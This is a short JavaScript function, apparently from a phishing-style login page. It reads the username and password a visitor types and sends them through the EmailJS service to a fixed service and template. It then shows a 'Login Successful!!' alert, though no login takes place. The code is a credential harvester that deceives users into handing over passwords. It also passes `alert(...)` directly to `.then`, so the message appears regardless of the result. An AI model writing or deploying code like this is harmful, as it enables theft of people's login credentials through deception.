function sendMail(){
    let parms = {
        username: document.getElementById("username").value,
        password: document.getElementById("password").value,
    }

    emailjs.send("service_pugb07d", "template_vgsk61v", parms).then(alert("Login Successful!!"))
}
